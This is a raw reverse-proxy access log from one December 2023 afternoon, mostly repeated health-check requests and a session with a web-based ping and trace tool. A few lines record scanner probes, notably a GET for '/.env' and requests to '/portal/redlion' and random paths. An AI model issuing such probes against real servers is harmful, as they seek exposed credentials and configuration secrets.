159.203.109.206 - - [18/Dec/2023:16:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5575 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5576 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5577 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5578 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5579 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5580 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5581 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5582 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5583 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5584 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5585 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5586 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5587 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5588 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5589 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5590 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5591 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5592 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5593 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5594 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5595 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5596 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5597 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5598 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5599 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5600 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5601 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5602 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5603 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5604 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5605 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5606 "www@docker" "http://172.18.0.9:80" 5ms
159.203.109.206 - - [18/Dec/2023:16:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5607 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5608 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5609 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5610 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5611 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5612 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5613 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5614 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5615 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5616 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:16:24:42 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5617 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:16:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5618 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5619 "www@docker" "http://172.18.0.9:80" 0ms
107.170.208.23 - - [18/Dec/2023:16:25:44 +0000] "GET /portal/redlion HTTP/1.1" 301 17 "-" "-" 5620 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:16:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5621 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5622 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5623 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5624 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5625 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5626 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [18/Dec/2023:16:28:40 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5627 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:16:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5628 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5629 "www@docker" "http://172.18.0.9:80" 0ms
54.36.115.221 - - [18/Dec/2023:16:29:46 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 5630 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [18/Dec/2023:16:29:46 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 5631 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:16:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5632 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5633 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5634 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5635 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5636 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5637 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5638 "www@docker" "http://172.18.0.9:80" 0ms
128.14.134.170 - - [18/Dec/2023:16:33:33 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5639 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:16:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5640 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5641 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5642 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5643 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5644 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5645 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5646 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5647 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5648 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5649 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5650 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5651 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5652 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5653 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5654 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5655 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5656 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5657 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5658 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5659 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5660 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5661 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5662 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5663 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5664 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5665 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5666 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5667 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5668 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5669 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5670 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5671 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5672 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5673 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5674 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5675 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5676 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5677 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5678 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5679 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5680 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5681 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5682 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5683 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5684 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5685 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5686 "www@docker" "http://172.18.0.9:80" 0ms
192.53.171.56 - - [18/Dec/2023:16:57:14 +0000] "GET /HacP HTTP/1.1" 301 17 "-" "-" 5687 "web-to-websecure@internal" "-" 0ms
192.53.171.56 - - [18/Dec/2023:16:57:14 +0000] "GET /gILa HTTP/1.1" 301 17 "-" "-" 5688 "web-to-websecure@internal" "-" 0ms
198.58.122.115 - - [18/Dec/2023:16:57:15 +0000] "GET /VQQd HTTP/1.1" 404 19 "-" "-" 5689 "-" "-" 0ms
198.58.122.115 - - [18/Dec/2023:16:57:16 +0000] "GET /xe1O HTTP/1.1" 404 19 "-" "-" 5690 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:16:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5691 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5692 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5693 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5694 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:16:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5695 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5696 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:17:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5697 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:17:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5698 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:17:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5699 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:17:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5700 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:17:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5701 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5702 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:17:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5703 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5704 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:17:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5705 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5706 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [18/Dec/2023:17:05:11 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5707 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:17:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5708 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5709 "www@docker" "http://172.18.0.9:80" 0ms
129.55.200.27 - - [18/Dec/2023:17:05:54 +0000] "GET /trace/ HTTP/2.0" 200 6035 "-" "-" 5710 "livetrace@docker" "http://172.18.0.3:80" 64ms
129.55.200.27 - - [18/Dec/2023:17:05:55 +0000] "GET /trace/styles.css?version=11 HTTP/2.0" 304 0 "-" "-" 5711 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:03 +0000] "GET /trace/startping.php?id=3flm81xup HTTP/2.0" 200 104 "-" "-" 5712 "livetrace@docker" "http://172.18.0.3:80" 5ms
129.55.200.27 - - [18/Dec/2023:17:06:04 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5713 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:05 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5714 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:06 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5715 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:07 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5716 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:08 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5717 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:09 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5718 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:10 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5719 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:11 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5720 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:12 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5721 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:13 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5722 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:14 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5723 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:15 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5724 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:16 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5725 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:17 +0000] "GET /trace/starttrace.php?id=oh23ciahy HTTP/2.0" 200 105 "-" "-" 5726 "livetrace@docker" "http://172.18.0.3:80" 3ms
129.55.200.27 - - [18/Dec/2023:17:06:17 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5727 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:18 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 67 "-" "-" 5728 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:18 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5729 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:19 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 67 "-" "-" 5730 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:19 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5731 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:20 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 67 "-" "-" 5732 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:20 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 2 "-" "-" 5733 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:21 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 67 "-" "-" 5734 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:21 +0000] "GET /trace/pollping.php?id=3flm81xup HTTP/2.0" 200 4 "-" "-" 5735 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:21 +0000] "GET /trace/cleanping.php?id=3flm81xup HTTP/2.0" 200 71 "-" "-" 5736 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:22 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 67 "-" "-" 5737 "livetrace@docker" "http://172.18.0.3:80" 1ms
159.203.109.206 - - [18/Dec/2023:17:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5738 "www@docker" "http://172.18.0.9:80" 0ms
129.55.200.27 - - [18/Dec/2023:17:06:23 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 67 "-" "-" 5739 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:24 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 67 "-" "-" 5740 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:25 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 67 "-" "-" 5741 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:26 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 67 "-" "-" 5742 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:27 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 67 "-" "-" 5743 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:28 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 120 "-" "-" 5744 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:29 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 120 "-" "-" 5745 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:30 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 120 "-" "-" 5746 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:31 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 120 "-" "-" 5747 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:32 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 120 "-" "-" 5748 "livetrace@docker" "http://172.18.0.3:80" 3ms
